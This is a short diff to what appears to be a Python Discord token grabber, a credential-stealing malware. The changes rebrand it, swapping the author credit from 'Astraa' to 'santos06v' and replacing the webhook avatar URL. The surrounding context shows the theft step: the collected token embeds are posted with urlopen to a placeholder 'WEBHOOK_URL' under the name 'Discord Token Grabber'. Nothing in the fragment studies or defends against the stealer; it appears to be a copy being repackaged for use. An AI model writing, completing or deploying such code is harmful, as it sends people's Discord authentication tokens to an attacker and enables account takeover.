@@ -164,7 +164,7 @@ def main():
                     "icon_url": avatar_url
                 },
                 "footer": {
-                    "text": f"Token Grabber By Astraa",
+                    "text": f"Token Grabber By santos06v",
                 }
             }
             embeds.append(embed)
@@ -178,7 +178,7 @@ def main():
         "content": "",
         "embeds": embeds,
         "username": "Discord Token Grabber",
-        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
+        "avatar_url": "https://media.discordapp.net/attachments/930682284779114497/931432802904338442/ca609c3f30e764c659915e0c3e0fe712.png"
     }
     try:
         urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
